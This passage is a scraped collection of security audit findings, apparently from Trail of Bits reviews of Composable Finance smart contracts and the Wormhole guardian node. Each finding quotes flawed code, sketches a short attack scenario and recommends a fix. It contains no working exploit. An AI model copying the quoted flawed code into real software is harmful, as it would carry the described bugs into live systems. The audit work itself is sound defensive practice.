Incorrect safeIncreaseAllowance() amount can cause invest() calls to revert ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf", "body": "Calls to make investments through Sushiswap can revert because the sushiSwapRouter may not have the token allowances needed to fulll the requests. The owner of the MosaicHolding contract is responsible for investing user-deposited funds in investment strategies. The contract owner does this by calling the contracts invest() function, which then calls makeInvestment() on the investment strategy meant to receive the funds (gure 25.1). function invest ( IInvestmentStrategy.Investment[] calldata _investments, address _investmentStrategy , bytes calldata _data ) external override onlyAdmin validAddress(_investmentStrategy) { require (investmentStrategies[_investmentStrategy], \"ERR: STRATEGY NOT SET\" ); uint256 investmentsLength = _investments.length; address contractAddress = address ( this ); for ( uint256 i ; i < investmentsLength; i++) { IInvestmentStrategy.Investment memory investment = _investments[i]; require (investment.amount != 0 && investment.token != address ( 0 ), \"ERR: TOKEN AMOUNT\" ); IERC20Upgradeable token = IERC20Upgradeable(investment.token); require (token.balanceOf(contractAddress) >= investment.amount, \"ERR: BALANCE\" ); token.safeApprove(_investmentStrategy, investment.amount); } uint256 mintedTokens = IInvestmentStrategy(_investmentStrategy).makeInvestment( _investments, _data ); emit FoundsInvested(_investmentStrategy, msg.sender , mintedTokens); } Figure 25.1: The invest function in MosaicHolding:190- To deposit funds into the SushiswapLiquidityProvider investment strategy, the contract must increase the sushiSwapRouter s approval limits to account for the tokenA and tokenB amounts to be transferred. However, tokenB s approval limit is increased only to the amount of the tokenA investment (gure 25.2). function makeInvestment (Investment[] calldata _investments, bytes calldata _data) external override onlyInvestor nonReentrant returns ( uint256 ) { Investment memory investmentA = _investments[ 0 ]; Investment memory investmentB = _investments[ 1 ]; IERC20Upgradeable tokenA = IERC20Upgradeable(investmentA.token); IERC20Upgradeable tokenB = IERC20Upgradeable(investmentB.token); tokenA.safeTransferFrom( msg.sender , address ( this ), investmentA.amount); tokenB.safeTransferFrom( msg.sender , address ( this ), investmentB.amount); tokenA.safeIncreaseAllowance( address (sushiSwapRouter), investmentA.amount); tokenB.safeIncreaseAllowance( address (sushiSwapRouter), investmentA.amount); ( uint256 deadline , uint256 minA , uint256 minB ) = abi.decode( _data, ( uint256 , uint256 , uint256 ) ); (, , uint256 liquidity ) = sushiSwapRouter.addLiquidity( investmentA.token, investmentB.token, investmentA.amount, investmentB.amount, minA, minB, address ( this ), deadline ); return liquidity; } Figure 25.2: The makeInvestment function in SushiswapLiquidityProvider : 52-85 If the amount of tokenB to be deposited is greater than that of tokenA , sushiSwapRouter will fail to transfer the tokens, and the transaction will revert. Exploit Scenario Alice, the owner of the MosaicHolding contract, wishes to invest liquidity in a Sushiswap liquidity pool. The amount of the tokenB investment is greater than that of tokenA . The sushiSwapRouter does not have the right token allowances for the transaction, and the investment request fails. Recommendations Short term, change the amount value used in the safeIncreaseAllowance() call from investmentA.amount to investmentB.amount . Long term, review the codebase to identify similar issues. Additionally, create a more extensive test suite capable of testing edge cases that may invalidate system assumptions.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Medium"]}, {"title": "17. Incorrect check of token status in the providePassiveLiquidity function ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf", "body": "A passive LP can provide liquidity in the form of a token that is not whitelisted. The providePassiveLiquidity() function in MosaicVault is called by users who wish to participate in the Mosaic system as passive LPs. As part of the functions execution, it checks whether there is a ReceiptToken associated with the _tokenAddress input parameter (gure 17.1). This is equivalent to checking whether the token is whitelisted by the system. function providePassiveLiquidity( uint256 _amount, address _tokenAddress) external payable override nonReentrant whenNotPaused { require (_amount > 0 || msg.value > 0 , \"ERR: AMOUNT\" ); if ( msg.value > 0 ) { require ( vaultConfig.getUnderlyingIOUAddress(vaultConfig.wethAddress()) != address ( 0 ), \"ERR: WETH NOT WHITELISTED\" ); _provideLiquidity( msg.value , vaultConfig.wethAddress(), 0 ); } else { require (_tokenAddress != address ( 0 ), \"ERR: INVALID TOKEN\" ); require ( vaultConfig.getUnderlyingIOUAddress(_tokenAddress) != address ( 0 ), \"ERR: TOKEN NOT WHITELISTED\" ); _provideLiquidity(_amount, _tokenAddress, 0 ); } } Figure 17.1: The providePassiveLiquidity function in MosaicVault:127-149 However, providePassiveLiquidity() uses an incorrect function call to check the whitelist status. Instead of calling getUnderlyingReceiptAddress() , it calls getUnderlyingIOUAddress() . The same issue occurs in checks of WETH deposits. Exploit Scenario Eve decides to deposit liquidity in the form of a token that is whitelisted only for active LPs. The token provides a higher yield than the tokens whitelisted for passive LPs. This may enable Eve to receive a higher annual percentage yield on her deposit than other passive LPs in the system receive on theirs. Recommendations Short term, change the function called to validate tokenAddress and wethAddress from getUnderlyingIOUAddress() to getUnderlyingReceiptAddress() . Long term, take the following steps:    Review the codebase to identify similar errors. Consider whether the assumption that the same tokens will be whitelisted for both passive and active LPs will hold in the future. Create a more extensive test suite capable of testing edge cases that may invalidate system assumptions.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "18. Solidity compiler optimizations can be problematic ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf", "body": "The Composable Finance contracts have enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed . Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. High-severity security issues due to optimization bugs have occurred in the past . A high-severity bug in the emscripten -generated solc-js compiler used by True and Remix persisted until late 2018. The x for this bug was not reported in the Solidity CHANGELOG. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6 . More recently, another bug due to the incorrect caching of keccak256 was reported. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe . It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizationsor in the Emscripten transpilation to solc-js causes a security vulnerability in the Composable Finance contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "19. Lack of contract documentation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf", "body": "The codebases lack code documentation, high-level descriptions, and examples, making the contracts dicult to review and increasing the likelihood of user mistakes. The CrosslayerPortal codebase would benet from additional documentation, including on the following:       The logic responsible for setting the roles in the core and the reason for the manipulation of indexes The incoming function arguments and the values used on source chains and destination chains The arithmetic involved in reward calculations and the relayers distribution of tokens The checks performed by the o-chain components, such as the relayer and the rebalancing bot The third-party integrations The rebalancing arithmetic and calculations There should also be clear NatSpec documentation on every function, identifying the unit of each variable, the functions intended use, and the functions safe values. The documentation should include all expected properties and assumptions relevant to the aforementioned aspects of the codebase. Recommendations Short term, review and properly document the aforementioned aspects of the codebase. Long term, consider writing a formal specication of the protocol.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "21. Unnecessary complexity due to interactions with native and smart contract tokens ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf", "body": "The Composable Finance code is needlessly complex and has excessive branching. Its complexity largely results from the integration of both ERC20s and native tokens (i.e., ether). Creating separate functions that convert native tokens to ERC20s and then interact with functions that must receive ERC20 tokens (i.e., implementing separation of concerns) would drastically simplify and optimize the code. This complexity is the source of many bugs and increases the gas costs for all users whether or not they need to distinguish between ERC20s and ether. It is best practice to make components as small as possible and to separate helpful but noncritical components into periphery contracts. This reduces the attack surface and improves readability. Figure 21.1 shows an example of complex code. if (tempData.isSlp) { IERC20(sushiConfig.slpToken()).safeTransfer( msg.sender , tempData.slpAmount ); [...] } else { //unwrap and send the right asset [...] if (tempData.isEth) { [...] } else { IERC20(sushiConfig.wethToken()).safeTransfer( Figure 21.1: Part of the withdraw function in SushiSlpStrategy.sol:L180-L216 Recommendations Short term, remove the native ether interactions and use WETH instead. Long term, minimize the function complexity by breaking functions into smaller units. Additionally, refactor the code with minimalism in mind and extend the core functionality into periphery contracts.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "29. Use of legacy openssl version in CrosslayerPortal tests ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf", "body": "The CrosslayerPortal project uses a legacy version of openssl to run tests. While this version is not exposed in production, the use of outdated security protocols may be risky (gure 29.1). An unexpected error occurred: Error: error:0308010C:digital envelope routines::unsupported at new Hash (node:internal/crypto/hash:67:19) at Object.createHash (node:crypto:130:10) at hash160 (~/CrosslayerPortal/node_modules/ethereum-cryptography/vendor/hdkey-without-crypto.js:249:21 ) at HDKey.set (~/CrosslayerPortal/node_modules/ethereum-cryptography/vendor/hdkey-without-crypto.js:50:24) at Function.HDKey.fromMasterSeed (~/CrosslayerPortal/node_modules/ethereum-cryptography/vendor/hdkey-without-crypto.js:194:20 ) at deriveKeyFromMnemonicAndPath (~/CrosslayerPortal/node_modules/hardhat/src/internal/util/keys-derivation.ts:21:27) at derivePrivateKeys (~/CrosslayerPortal/node_modules/hardhat/src/internal/core/providers/util.ts:29:52) at normalizeHardhatNetworkAccountsConfig (~/CrosslayerPortal/node_modules/hardhat/src/internal/core/providers/util.ts:56:10) at createProvider (~/CrosslayerPortal/node_modules/hardhat/src/internal/core/providers/construction.ts:78:59) at ~/CrosslayerPortal/node_modules/hardhat/src/internal/core/runtime-environment.ts:80:28 { opensslErrorStack: [ 'error:03000086:digital envelope routines::initialization error' ], library: 'digital envelope routines', reason: 'unsupported', code: 'ERR_OSSL_EVP_UNSUPPORTED' } Figure 29.1: Errors agged in npx hardhat testing Recommendations Short term, refactor the code to use a new version of openssl to prevent the exploitation of openssl vulnerabilities. Long term, avoid using outdated or legacy versions of dependencies. 22. Commented-out and unimplemented conditional statements Severity: Undetermined Diculty: Low Type: Undened Behavior Finding ID: TOB-CMP-22 Target: apyhunter-tricrypto/contracts/sushiswap/SushiSlpStrategy.sol", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "23. Error-prone NFT management in the Summoner contract ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/AdvancedBlockchainQ12022.pdf", "body": "The Summoner contracts ability to hold NFTs in a number of states may create confusion regarding the contracts states and the dierences between the contracts. For instance, the Summoner contract can hold the following kinds of NFTs:   NFTs that have been pre-minted by Composable Finance and do not have metadata attached to them Original NFTs that have been locked by the Summoner for minting on the destination chain  MosaicNFT wrapper tokens, which are copies of NFTs that have been locked and are intended to be minted on the destination chain As the system is scaled, the number of NFTs held by the Summoner , especially the number of pre-minted NFTs, will increase signicantly. Recommendations Simplify the NFT architecture; see the related recommendations in Appendix E .", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Low"]}, {"title": "1. Lack of doc comments ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-wormhole-securityreview.pdf", "body": "Publicly accessible functions within the governor and watcher code generally lack doc comments. Inadequately documented code can be misunderstood, which increases the likelihood of an improper bug x or a mis-implemented feature. There are ten publicly accessible functions within governor.go. However, only one such function has a comment preceding it (see gure 1.1). // Returns true if the message can be published, false if it has been added to the pending list. func (gov *ChainGovernor) ProcessMsg(msg *common.MessagePublication) bool { Figure 1.1: node/pkg/governor/governor.go#L281L282 Similarly, there are at least 28 publicly accessible functions among the non-evm watchers. However, only seven of them are preceded by doc comments, and only one of the seven is not in the Near watcher code (see gure 1.2). // GetLatestFinalizedBlockNumber() returns the latest published block. func (s *SolanaWatcher) GetLatestFinalizedBlockNumber() uint64 { Figure 1.2: node/pkg/watchers/solana/client.go#L846L847 Gos ocial documentation on doc comments states the following: A funcs doc comment should explain what the function returns or, for functions called for side eects, what it does. Exploit Scenario Alice, a Wormhole developer, implements a new node feature involving the governor. Alice misunderstands how the functions called by her new feature work. Alice introduces a vulnerability into the node as a result. Recommendations Short term, add doc comments to each function that are accessible from outside of the package in which the function is dened. This will facilitate code review and reduce the likelihood that a developer introduces a bug into the code because of a misunderstanding. Long term, regularly review code comments to ensure they are accurate. Documentation must be kept up to date to be benecial. References  Go Doc Comments", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "2. Fields protected by mutex are not documented ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-wormhole-securityreview.pdf", "body": "The elds protected by the governors mutex are not documented. A developer adding functionality to the governor is unlikely to know whether the mutex must be locked for their application. The ChainGovernor struct appears in gure 2.1. The Wormhole Foundation communicated to us privately that the mutex protects the elds highlighted in yellow. Note that, because there are 13 elds in ChainGovernor (not counting the mutex itself), the likelihood of a developer guessing exactly the set of highlighted elds is small. type ChainGovernor struct { db logger mutex tokens tokensByCoinGeckoId chains msgsSeen db.GovernorDB *zap.Logger sync.Mutex map[tokenKey]*tokenEntry map[string][]*tokenEntry map[vaa.ChainID]*chainEntry map[string]bool // Key is hash, payload is consts transferComplete and transferEnqueued. []*common.MessagePublication int string int msgsToPublish dayLengthInMinutes coinGeckoQuery env nextStatusPublishTime time.Time nextConfigPublishTime time.Time statusPublishCounter int64 configPublishCounter int64 } Figure 2.1: node/pkg/governor/governor.go#L119L135 Exploit Scenario Alice, a Wormhole developer, adds a new function to the governor.  Case 1: Alice does not lock the mutex, believing that her function operates only on elds that are not protected by the mutex. However, by not locking the mutex, Alice introduces a race condition into the governor.  Case 2: Alice locks the mutex just to be safe. However, the elds on which Alices function operates are not protected by the mutex. Alice introduces a deadlock into the code as a result. Recommendations Short term, document the elds within ChainGovernor that are protected by the mutex. This will reduce the likelihood that a developer incorrectly locks, or does not lock, the mutex. Long term, regularly review code comments to ensure they are accurate. Documentation must be kept up to date to be benecial.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "3. Potential nil pointer dereference in reloadPendingTransfer ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-wormhole-securityreview.pdf", "body": "A potential nil pointer dereference exists in reloadPendingTransfer. The bug could be triggered if invalid data were stored within a nodes database, and could make it impossible to restart the node. The relevant code appears in gures 3.1 and 3.2 When DecodeTransferPayloadHdr returns an error, the payload that is also returned is used to construct the error message (gure 3.1). However, as shown in gure 3.2, the returned payload can be nil. payload, err := vaa.DecodeTransferPayloadHdr(msg.Payload) if err != nil { gov.logger.Error(\"cgov: failed to parse payload for reloaded pending transfer, dropping it\", zap.String(\"MsgID\", msg.MessageIDString()), zap.Stringer(\"TxHash\", msg.TxHash), zap.Stringer(\"Timestamp\", msg.Timestamp), zap.Uint32(\"Nonce\", msg.Nonce), zap.Uint64(\"Sequence\", msg.Sequence), zap.Uint8(\"ConsistencyLevel\", msg.ConsistencyLevel), zap.Stringer(\"EmitterChain\", msg.EmitterChain), zap.Stringer(\"EmitterAddress\", msg.EmitterAddress), zap.Stringer(\"tokenChain\", payload.OriginChain), zap.Stringer(\"tokenAddress\", payload.OriginAddress), zap.Error(err), ) return } Figure 3.1: node/pkg/governor/governor_db.go#L90L106 func DecodeTransferPayloadHdr(payload []byte) (*TransferPayloadHdr, error) { if !IsTransfer(payload) { return nil, fmt.Errorf(\"unsupported payload type\") } Figure 3.2: sdk/vaa/structs.go#L962L965 Exploit Scenario Eve nds a code path that allows her to store erroneous payloads within the database of Alices node. Alice is unable to restart her node, as it tries to dereference a nil pointer on each attempt. Recommendations Short term, either eliminate the use of payload when constructing the error message, or verify that the payload is not nil before attempting to dereference it. This will eliminate a potential nil pointer dereference. Long term, add tests to exercise additional error paths within governor_db.go. This could help to expose bugs like this one.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "4. Unchecked type assertion in queryCoinGecko ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-wormhole-securityreview.pdf", "body": "The code that processes CoinGecko responses contains an unchecked type assertion. The bug is triggered when CoinGecko returns invalid data, and could be exploited for denial of service (DoS). The relevant code appears in gure 4.1. The data object that is returned as part of CoinGeckos response to a query is cast to a map m of type map[string]interface{} (yellow). However, the casts success is not veried. As a result, a nil pointer dereference can occur when m is accessed (red). m := data.(map[string]interface{}) if len(m) != 0 { var ok bool price, ok = m[\"usd\"].(float64) if !ok { to configured price for this token\", zap.String(\"coinGeckoId\", coinGeckoId)) gov.logger.Error(\"cgov: failed to parse coin gecko response, reverting // By continuing, we leave this one in the local map so the price will get reverted below. continue } } Figure 4.1: node/pkg/governor/governor_prices.go#L144L153 Note that if the access to m is successful, the resulting value is cast to a float64. In this case, the casts success is veried. A similar check should be performed for the earlier cast. Exploit Scenario Eve, a malicious insider at CoinGecko, sends invalid data to Wormhole nodes, causing them to crash. Recommendations Short term, in the code in gure 4.1, verify that the cast in yellow is successful by adding a check similar to the one highlighted in green. This will eliminate the possibility of a node crashing because CoinGecko returns invalid data. Long term, consider enabling the forcetypeassert lint in CI. This bug was initially agged by that lint, and then conrmed by our queryCoinGecko response fuzzer. Enabling the lint could help to expose additional bugs like this one.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "5. Governor relies on a single external source of truth for asset prices ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-wormhole-securityreview.pdf", "body": "The governor relies on a single external source (CoinGecko) for asset prices, which could enable an attacker to transfer more than they would otherwise be allowed. The governor fetches an assets price from CoinGecko, compares the price to a hard-coded default, and uses whichever is larger (gure 5.1). However, if an assets price were to grow much larger than the hard-coded default, the hard-coded default would essentially be meaningless, and CoinGecko would become the sole source of truth for the price of that asset. Such a situation could be problematic, for example, if the assets price were volatile and CoinGecko had trouble keeping up with the price changes. // We should use the max(coinGeckoPrice, configuredPrice) as our price for computing notional value. func (te tokenEntry) updatePrice() { if (te.coinGeckoPrice == nil) || (te.coinGeckoPrice.Cmp(te.cfgPrice) < 0) { te.price.Set(te.cfgPrice) } else { te.price.Set(te.coinGeckoPrice) } } Figure 5.1: node/pkg/governor/governor_prices.go#L205L212 Exploit Scenario Eve obtains a large quantity of AliceCoin from a hack. AliceCoins price is both highly volatile and much larger than what was hard-coded in the last Wormhole release. CoinGecko has trouble keeping up with the current price of AliceCoin. Eve identies a point in time when the price that CoinGecko reports is low (but still higher than the hard-coded default). Eve uses the opportunity to move more of her maliciously obtained AliceCoin than Wormhole would allow if CoinGecko had reported the correct price. Recommendations Short term, monitor the price of assets supported by Wormhole. If the price of an asset increases substantially, consider issuing a release that takes into account the new price. This will help to avoid situations where CoinGecko becomes the sole source of truth of the price of an asset. Long term, incorporate additional price oracles besides CoinGecko. This will provide more robust protection than requiring a human to monitor prices and issue point releases.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "6. Potential resource leak ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-wormhole-securityreview.pdf", "body": "Calls to some Contexts cancel functions are missing along certain code paths involving panics. If an attacker were able to exercise these code paths in rapid succession, they could exhaust system resources and cause a DoS. Within watcher.go, WithTimeout is essentially used in one of two ways, using the pattern shown in either gure 6.1 or 6.2. The pattern of gure 6.1 is problematic because cancel will not be called if a panic occurs in MessageEventsForTransaction. By comparison, cancel will be called if a panic occurs after the defer statement in gure 6.2. Note that if a panic occurred in either gure 6.1 or 6.2, RunWithScissors (gure 6.3) would prevent the program from terminating. timeout, cancel := context.WithTimeout(ctx, 5*time.Second) blockNumber, msgs, err := MessageEventsForTransaction(timeout, w.ethConn, w.contract, w.chainID, tx) cancel() Figure 6.1: node/pkg/watchers/evm/watcher.go#L395L397 timeout, cancel := context.WithTimeout(ctx, 15*time.Second) defer cancel() Figure 6.2: node/pkg/watchers/evm/watcher.go#L186L187 // Start a go routine with recovering from any panic by sending an error to a error channel func RunWithScissors(ctx context.Context, errC chan error, name string, runnable supervisor.Runnable) { ScissorsErrors.WithLabelValues(\"scissors\", name).Add(0) go func() { defer func() { if r := recover(); r != nil { switch x := r.(type) { case error: errC <- fmt.Errorf(\"%s: %w\", name, x) default: errC <- fmt.Errorf(\"%s: %v\", name, x) } ScissorsErrors.WithLabelValues(\"scissors\", name).Inc() } }() err := runnable(ctx) if err != nil { errC <- err } }() } Figure 6.3: node/pkg/common/scissors.go#L20L41 Golangs ocial Context documentation states: The WithCancel, WithDeadline, and WithTimeout functions take a Context (the parent) and return a derived Context (the child) and a CancelFunc.  Failing to call the CancelFunc leaks the child and its children until the parent is canceled or the timer res.  In light of the above guidance, it seems prudent to call the cancel function, even along panicking paths. Note that the problem described applies to three locations in watch.go: one involving a call to MessageEventsForTransaction (gure 6.1), one involving a call to TimeOfBlockByHash, and one involving a call to TransactionReceipt. Exploit Scenario Eve discovers a code path she can call in rapid succession, which induces a panic in the call to MessageEventsForTransaction (gure 6.1). Eve exploits this code path to crash Wormhole nodes. Recommendations Short term, use the defer cancel() pattern (gure 6.2) wherever WithTimeout is used. This will help to prevent DoS conditions. Long term, regard all code involving Contexts with heightened scrutiny. Contexts are frequently a source of resource leaks in Go programs, and deserve elevated attention. References  Golang Context WithTimeout Example", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "7. PolygonConnector does not properly use channels ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-wormhole-securityreview.pdf", "body": "The Polygon connector does not read from the PollSubscription.quit channel, nor does it write to the PollSubscription.unsubDone channel. A caller who calls Unsubscribe on the PollSubscription could hang. A PollSubscription struct contains three channels: err, quit, and unsubDone (gure 7.1). Based on our understanding of the code, the entity that fullls the subscription writes to the err and unsubDone channels, and reads from the quit channel. Conversely, the entity that consumes the subscription reads from the err and unsubDone channels, and writes to the quit channel.1 type PollSubscription struct { errOnce err quit unsubDone chan struct{} sync.Once chan error chan error } Figure 7.1: node/pkg/watchers/evm/connectors/common.go#L38L43 More specically, the consumer can call PollSubscription.Unsubscribe, which writes ErrUnsubscribed to the quit channel and waits for a message on the unsubDone channel (gure 7.2). func (sub *PollSubscription) Unsubscribe() { sub.errOnce.Do(func() { select { case sub.quit <- ErrUnsubscribed: <-sub.unsubDone case <-sub.unsubDone: } close(sub.err) }) } Figure 7.2: node/pkg/watchers/evm/connectors/common.go#L59L68 1 If our understanding is correct, we recommend documenting these facts. However, the Polygon connector does not read from the quit channel, nor does it write to the unsubDone channel (gure 7.3). This is unlike BlockPollConnector (gure 7.4), for example. Thus, if a caller tries to call Unsubscribe on the Polygon connector PollSubscription, the caller may hang. select { case <-ctx.Done(): return nil case err := <-messageSub.Err(): sub.err <- err case checkpoint := <-messageC: if err := c.processCheckpoint(ctx, sink, checkpoint); err != nil { sub.err <- fmt.Errorf(\"failed to process checkpoint: %w\", err) } } Figure 7.3: node/pkg/watchers/evm/connectors/polygon.go#L120L129 select { case <-ctx.Done(): blockSub.Unsubscribe() innerErrSub.Unsubscribe() return nil case <-sub.quit: blockSub.Unsubscribe() innerErrSub.Unsubscribe() sub.unsubDone <- struct{}{} return nil case v := <-innerErrSink: sub.err <- fmt.Errorf(v) } Figure 7.4: node/pkg/watchers/evm/connectors/poller.go#L180L192 Exploit Scenario Alice, a Wormhole developer, adds a code path that involves calling Unsubscribe on a Polygon connectors PollSubscription. By doing so, Alice introduces a deadlock into the code. Recommendations Short term, adjust the code in gure 7.3 so that it reads from the quit channel and writes to the unsubDone channel, similar to how the code in gure 7.4 does. This will eliminate a class of code paths along which hangs or deadlocks could occur. Long term, consider refactoring the code so that the select statements in gures 7.3 and 7.4, as well as a similar statement in LogPollConnector, are consolidated under a single function. The three statements appear similar in their behavior; combining them would make the code more robust against future changes and could help to prevent bugs like this one.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Undetermined"]}, {"title": "8. Receiver closes channel, contradicting Golang guidance ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-wormhole-securityreview.pdf", "body": "According to Golangs ocial guidance, Only the sender should close a channel, never the receiver. Sending on a closed channel will cause a panic. However, along some code paths within the watcher code, the receiver of a channel closes the channel. When PollSubscription.Unscbscribe is called, it closes the err channel (gure 8.1). However, in logpoller.go (gure 8.2), the caller of Unsubscribe (red) is clearly an err channel receiver (green). func (sub *PollSubscription) Err() <-chan error { return sub.err } func (sub *PollSubscription) Unsubscribe() { sub.errOnce.Do(func() { select { case sub.quit <- ErrUnsubscribed: <-sub.unsubDone case <-sub.unsubDone: } close(sub.err) }) } Figure 8.1: node/pkg/watchers/evm/connectors/common.go#L55L68 sub, err := l.SubscribeForBlocks(ctx, errC, blockChan) if err != nil { return err } defer sub.Unsubscribe() supervisor.Signal(ctx, supervisor.SignalHealthy) for { select { case <-ctx.Done(): return ctx.Err() case err := <-sub.Err(): return err case err := <-errC: return err case block := <-blockChan: if err := l.processBlock(ctx, logger, block); err != nil { l.errFeed.Send(err.Error()) } } } Figure 8.2: node/pkg/watchers/evm/connectors/logpoller.go#L49L69 Exploit Scenario Eve discovers a code path along which a sender tries to send to an already closed err channel and panics. RunWithScissors (see TOB-WORMGUWA-6) prevents the node from terminating, but the node is left in an undetermined state. Recommendations Short term, eliminate the call to close in gure 8.1. This will eliminate a class of code paths along which the err channels sender(s) could panic. Long term, for each channel, document who the expected senders and receivers are. This will help catch bugs like this one. References  A Tour of Go: Range and Close", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Undetermined"]}, {"title": "9. Watcher conguration is overly complex ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-wormhole-securityreview.pdf", "body": "The Run function of the Watcher congures each chains connection based on its elds, unsafeDevMode and chainID. This is done in a series of nested if-statements that span over 100 lines, amounting to a cyclomatic complexity over 90 which far exceeds what is considered complex. In order to make the code easier to understand, test, and maintain, it should be refactored. Rather than handling all of the business logic in a monolithic function, the logic for each chain should be isolated within a dedicated helper function. This would make the code easier to follow and reduce the likelihood that an update to one chains conguration inadvertently introduces a bug for other chains. if w.chainID == vaa.ChainIDCelo && !w.unsafeDevMode { // When we are running in mainnet or testnet, we need to use the Celo ethereum library rather than go-ethereum. // However, in devnet, we currently run the standard ETH node for Celo, so we need to use the standard go-ethereum. w.ethConn, err = connectors.NewCeloConnector(timeout, w.networkName, w.url, w.contract, logger) if err != nil { ethConnectionErrors.WithLabelValues(w.networkName, \"dial_error\").Inc() p2p.DefaultRegistry.AddErrorCount(w.chainID, 1) return fmt.Errorf(\"dialing eth client failed: %w\", err) } } else if useFinalizedBlocks { if w.chainID == vaa.ChainIDEthereum && !w.unsafeDevMode { safeBlocksSupported = true logger.Info(\"using finalized blocks, will publish safe blocks\") } else { logger.Info(\"using finalized blocks\") } [...] /* many more nested branches */ Figure 9.1: node/pkg/watchers/evm/watcher.go#L192L326 Exploit Scenario Alice, a wormhole developer, introduces a bug that causes guardians to run in unsafe mode in production while adding support for a new evm chain due to the diculty of modifying and testing the nested code. Recommendations Short term, isolate each chains conguration into a helper function and document how the congurations were determined. Long term, run linters in CI to identify code with high cyclomatic complexity and consider whether complex code can be simplied during code reviews.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Medium"]}, {"title": "10. evm.Watcher.Runs default behavior could hide bugs ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-wormhole-securityreview.pdf", "body": "evm.Watcher.Run tries to create an evm watcher, even if called with a ChainID that does not correspond to an evm chain. Additional checks should be added to evm.Watcher.Run to reject such ChainIDs. Approximately 60 watchers are started in node/cmd/guardiand/node.go (gure 10.1). Fifteen of those starts result in calls to evm.Watcher.Run. Given the substantial number of ChainIDs, one can imagine a bug where a developer tries to create an evm watcher with a ChainID that is not for an evm chain. Such a ChainID would be handled by the blanket else in gure 10.2, which tries to create an evm watcher. Such behavior could allow the bug to go unnoticed. To avoid this possibility, evm.Watcher.Runs default behavior should be to fail rather than to create a watcher. if shouldStart(ethRPC) { ... ethWatcher = evm.NewEthWatcher(*ethRPC, ethContractAddr, \"eth\", common.ReadinessEthSyncing, vaa.ChainIDEthereum, chainMsgC[vaa.ChainIDEthereum], setWriteC, chainObsvReqC[vaa.ChainIDEthereum], *unsafeDevMode) ... } if shouldStart(bscRPC) { ... bscWatcher := evm.NewEthWatcher(*bscRPC, bscContractAddr, \"bsc\", common.ReadinessBSCSyncing, vaa.ChainIDBSC, chainMsgC[vaa.ChainIDBSC], nil, chainObsvReqC[vaa.ChainIDBSC], *unsafeDevMode) ... } if shouldStart(polygonRPC) { ... polygonWatcher := evm.NewEthWatcher(*polygonRPC, polygonContractAddr, \"polygon\", common.ReadinessPolygonSyncing, vaa.ChainIDPolygon, chainMsgC[vaa.ChainIDPolygon], nil, chainObsvReqC[vaa.ChainIDPolygon], *unsafeDevMode) } ... Figure 10.1: node/cmd/guardiand/node.go#L1065L1104 ... } else if w.chainID == vaa.ChainIDOptimism && !w.unsafeDevMode { ... } else if w.chainID == vaa.ChainIDPolygon && w.usePolygonCheckpointing() { ... } else { w.ethConn, err = connectors.NewEthereumConnector(timeout, w.networkName, w.url, w.contract, logger) if err != nil { ethConnectionErrors.WithLabelValues(w.networkName, \"dial_error\").Inc() p2p.DefaultRegistry.AddErrorCount(w.chainID, 1) return fmt.Errorf(\"dialing eth client failed: %w\", err) } } Figure 10.2: node/pkg/watchers/evm/watcher.go#L192L326 Exploit Scenario Alice, a Wormhole developer, introduces a call to NewEvmWatcher with a ChainID that is not for an evm chain. evm.Watcher.Run accepts the invalid ChainID, and the error goes unnoticed. Recommendations Short term, rewrite evm.Watcher.Run so that a new watcher is created only when a ChainID for an evm chain is passed. When a ChainID for some other chain is passed, evm.Watcher.Run should return an error. Adopting such a strategy will help protect against bugs in node/cmd/guardiand/node.go. Long term:  Add tests to the guardiand package to verify that the right watcher is created for each ChainID. This will help ensure the packages correctness.  Consider whether TOB-WORMGUWA-9s recommendations should also apply to 